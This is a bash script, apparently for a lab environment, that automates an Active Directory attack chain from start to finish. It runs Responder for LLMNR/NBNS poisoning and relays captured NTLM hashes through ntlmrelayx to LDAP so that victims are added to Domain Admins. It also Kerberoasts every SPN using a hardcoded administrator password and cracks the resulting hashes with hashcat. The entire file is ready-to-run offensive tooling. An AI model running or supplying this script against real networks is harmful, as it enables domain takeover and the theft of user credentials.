#!/usr/bin/env bash
# lab_attack.sh – LLMNR poisoning + Kerberoast in one go
# Kali 2025.x • Responder 3.1.5 • ntlmrelayx (Impacket 0.11.1) • CrackMapExec 5.x

set -euo pipefail

#################### User‑tunable variables ####################
DOMAIN="corp.local"
DC_IP="<AD DC Target IP>"           # IP del Domain Controller
NET_IF="eth0"                     # interfaccia di Kali nella NAT Network
WORDLIST="/usr/share/wordlists/rockyou.txt"
OUTDIR="$HOME/lab_runs/$(date +%F_%H%M)"
################################################################

mkdir -p "$OUTDIR"
echo "[*] Logs & loot ➜ $OUTDIR"

##### 1.  Start Responder (LLMNR/NBNS poison) ##################
echo "[*] Launching Responder…"
screen -dmS responder bash -c "
    responder -I $NET_IF -wrf -v 2 -d -F -s -u -q | tee $OUTDIR/responder.log
"

##### 2.  Start ntlmrelayx → LDAP privilege escalation #########
# Qualsiasi hash NTLM catturato viene relayato su LDAP per aggiungere la vittima a Domain Admins
echo "[*] Launching ntlmrelayx (LDAP relay)…"
screen -dmS ntlmrelayx bash -c "
    ntlmrelayx.py -t ldap://$DC_IP \
                  -wh fake \
                  --add-group 'Domain Admins' \
                  -of $OUTDIR/relay.json \
                  -smb2support \
                  | tee $OUTDIR/ntlmrelayx.log
"

##### 3.  Kerberoast all SPNs via Impacket ####################
echo "[*] Enumerating & roasting SPNs…"
impacket-GetUserSPNs "corp.local/Administrator:Estate2025" -dc-ip "$DC_IP" \
    -request -outputfile "$OUTDIR/kerb.hash"

if [[ -s "$OUTDIR/kerb.hash" ]]; then
  echo "[*] Cracking Kerberoast hashes with hashcat…"
  hashcat -m 13100 "$OUTDIR/kerb.hash" "$WORDLIST" --force \
          --outfile "$OUTDIR/cracked.txt" --potfile-path "$OUTDIR/hashcat.potfile"

  echo "[+] Cracked passwords saved in $OUTDIR/cracked.txt"
else
  echo "[!] No SPN hashes captured – check Impacket output."
fi


##### 4.  Clean‑up helper ######################################
cat <<'EOF' > "$OUTDIR/stop_all.sh"
#!/usr/bin/env bash
screen -S responder -X quit 2>/dev/null
screen -S ntlmrelayx -X quit 2>/dev/null
echo "[+] Responder & ntlmrelayx stopped."
EOF
chmod +x "$OUTDIR/stop_all.sh"

echo -e "\n=== DONE ==="
echo "• Responder screen:   screen -r responder"
echo "• ntlmrelayx screen:  screen -r ntlmrelayx"
echo "• Stop them later:    $OUTDIR/stop_all.sh"
